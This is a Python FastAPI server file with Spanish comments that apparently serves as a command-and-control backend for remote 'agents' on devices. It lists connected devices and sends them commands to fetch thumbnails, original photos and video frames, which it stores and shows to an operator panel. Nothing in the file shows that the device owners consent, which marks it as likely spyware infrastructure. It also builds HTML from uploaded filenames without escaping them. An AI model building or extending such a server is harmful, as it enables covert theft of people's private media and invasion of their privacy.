import json
import base64
from fastapi import FastAPI, WebSocket, WebSocketDisconnect, Response, UploadFile, File
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import HTMLResponse
from pydantic import BaseModel
from typing import List, Dict, Any
from urllib.parse import unquote

app = FastAPI(title="Agente Control Backend (vFINAL - Completo)")
app.add_middleware(
    CORSMiddleware, allow_origins=["*"], allow_credentials=True, allow_methods=["*"], allow_headers=["*"],
)

# --- "BASE DE DATOS" EN MEMORIA ---
connected_agents: Dict[str, Dict[str, Any]] = {}
device_media_cache: Dict[str, Dict[str, Any]] = {}
fetch_status: Dict[str, str] = {}

# --- MODELOS DE DATOS ---
class Command(BaseModel):
    target_id: str
    action: str
    payload: str = ""

class Thumbnail(BaseModel):
    filename: str
    small_thumb_b64: str

class ThumbnailChunk(BaseModel):
    thumbnails: List[Thumbnail]
    is_final_chunk: bool

class FrameChunk(BaseModel):
    frame_b64: str

# --- ENDPOINTS ---

@app.get("/")
async def root():
    return {"message": "Servidor del Agente de Control activo."}

@app.websocket("/ws/{device_id}/{device_name:path}")
async def websocket_endpoint(websocket: WebSocket, device_id: str, device_name: str):
    device_name_decoded = unquote(device_name)
    await websocket.accept()
    print(f"[CONEXIÓN] Agente conectado: '{device_name_decoded}' (ID: {device_id})")
    connected_agents[device_id] = {"ws": websocket, "name": device_name_decoded}
    try:
        while True:
            await websocket.receive_text()
    except WebSocketDisconnect:
        name_to_print = connected_agents.get(device_id, {}).get("name", f"ID: {device_id}")
        print(f"[DESCONEXIÓN] Agente desconectado: '{name_to_print}'")
        if device_id in connected_agents: del connected_agents[device_id]
        if device_id in device_media_cache: del device_media_cache[device_id]
        if device_id in fetch_status: del fetch_status[device_id]

# --- ¡RUTA ESENCIAL RESTAURADA! ---
@app.get("/api/get-agents")
async def get_agents():
    return [{"id": device_id, "name": data["name"]} for device_id, data in connected_agents.items()]

@app.post("/api/send-command")
async def send_command_to_agent(command: Command):
    agent = connected_agents.get(command.target_id)
    if not agent: return {"status": "error", "message": "Agente no conectado"}
    if command.action == "get_thumbnails":
        print(f"Limpiando caché y reiniciando estado para {command.target_id[:8]}.")
        device_media_cache[command.target_id] = {}
        fetch_status[command.target_id] = "loading"
    if command.action == "request_video_as_frames":
        device_id, filename = command.target_id, command.payload
        if device_id in device_media_cache and filename in device_media_cache[device_id]:
            device_media_cache[device_id][filename]['frames_b64'] = []
    try:
        await agent["ws"].send_text(command.json())
        return {"status": "success", "message": "Comando enviado"}
    except Exception as e:
        return {"status": "error", "message": str(e)}

@app.post("/api/submit_media_chunk/{device_id}")
async def submit_media_chunk(device_id: str, chunk: ThumbnailChunk):
    if device_id not in device_media_cache: device_media_cache[device_id] = {}
    for thumb in chunk.thumbnails:
        device_media_cache[device_id][thumb.filename] = {"small_thumb_b64": thumb.small_thumb_b64}
    if chunk.is_final_chunk:
        fetch_status[device_id] = "complete"
        print(f"Recepción de lotes para {device_id[:8]} completada.")
    return {"status": "chunk received"}

@app.post("/api/upload_original_file/{device_id}/{filename:path}")
async def upload_original_file(device_id: str, filename: str, file: UploadFile = File(...)):
    decoded_filename = unquote(filename)
    if device_id not in device_media_cache or decoded_filename not in device_media_cache[device_id]:
        return Response(content="Archivo no solicitado", status_code=400)
    file_bytes = await file.read()
    original_b64 = base64.b64encode(file_bytes).decode('utf-8')
    device_media_cache[device_id][decoded_filename]['original_b64'] = original_b64
    print(f"Recibido archivo original (IMAGEN) '{decoded_filename}' de {device_id[:8]}.")
    return {"status": "success"}

@app.post("/api/upload_video_frame/{device_id}/{original_filename:path}")
async def upload_video_frame(device_id: str, original_filename: str, frame: FrameChunk):
    decoded_filename = unquote(original_filename)
    if device_id not in device_media_cache or decoded_filename not in device_media_cache[device_id]:
        return Response(content="Video no solicitado", status_code=400)
    if 'frames_b64' not in device_media_cache[device_id][decoded_filename]:
        device_media_cache[device_id][decoded_filename]['frames_b64'] = []
    device_media_cache[device_id][decoded_filename]['frames_b64'].append(frame.frame_b64)
    return {"status": "frame received"}


# --- "BUZÓN" EN MEMORIA PARA LOS MENSAJES ---
daily_message_cache: Dict[str, Dict[str, str]] = {}

# --- RUTA PARA QUE EL PANEL DEJE UN MENSAJE ---
@app.post("/api/set_daily_message/{device_id}")
async def set_daily_message(device_id: str, data: dict):
    # Se espera que 'data' sea {"image_b64": "...", "text": "..."}
    if "image_b64" in data and "text" in data:
        daily_message_cache[device_id] = data
        print(f"Nuevo mensaje guardado en el buzón para el dispositivo {device_id[:8]}.")
        return {"status": "message saved"}
    return {"status": "error", "message": "Datos incompletos"}

# --- RUTA PARA QUE LA APP REVISE EL BUZÓN ---
@app.get("/api/get_daily_message/{device_id}")
async def get_daily_message(device_id: str):
    return daily_message_cache.get(device_id, {})

@app.get("/api/get_media_list/{device_id}")
async def get_media_list(device_id: str):
    status = fetch_status.get(device_id, "complete")
    thumbnails = device_media_cache.get(device_id, {})
    return {"status": status, "thumbnails": thumbnails}

@app.get("/media/{device_id}/{filename:path}")
async def get_large_media(device_id: str, filename: str):
    decoded_filename = unquote(filename)
    cache = device_media_cache.get(device_id, {})
    media_item = cache.get(decoded_filename)
    if not media_item: return Response(content='{"detail":"Contenido no encontrado"}', status_code=404)
    if 'original_b64' in media_item:
        try:
            image_bytes = base64.b64decode(media_item['original_b64'])
            return Response(content=image_bytes, media_type="image/jpeg")
        except Exception as e: return Response(content=f'{{"detail":"Error: {e}"}}', status_code=500)
    if 'frames_b64' in media_item:
        html_content = f"<html><body style='background-color:#222;'>"
        html_content += f"<h1 style='color:white; text-align:center;'>Fotogramas de: {decoded_filename}</h1>"
        download_url = f"/download_frames/{device_id}/{filename}"
        html_content += f'<div style="text-align:center; margin:20px;"><a href="{download_url}" download ... >Descargar ZIP</a></div>' # Botón de descarga
        html_content += "<div style='display: flex; flex-wrap: wrap; justify-content: center;'>"
        for frame_b64 in media_item['frames_b64']:
            html_content += f"<img src='data:image/jpeg;base64,{frame_b64}' style='margin:8px; border:2px solid #444; max-width: 400px;'/>"
        html_content += "</div></body></html>"
        return HTMLResponse(content=html_content)
    return Response(content='{"detail":"Contenido no disponible"}', status_code=404)

# Aquí puedes añadir la ruta /download_frames que te di anteriormente si quieres la funcionalidad de descarga ZIP.
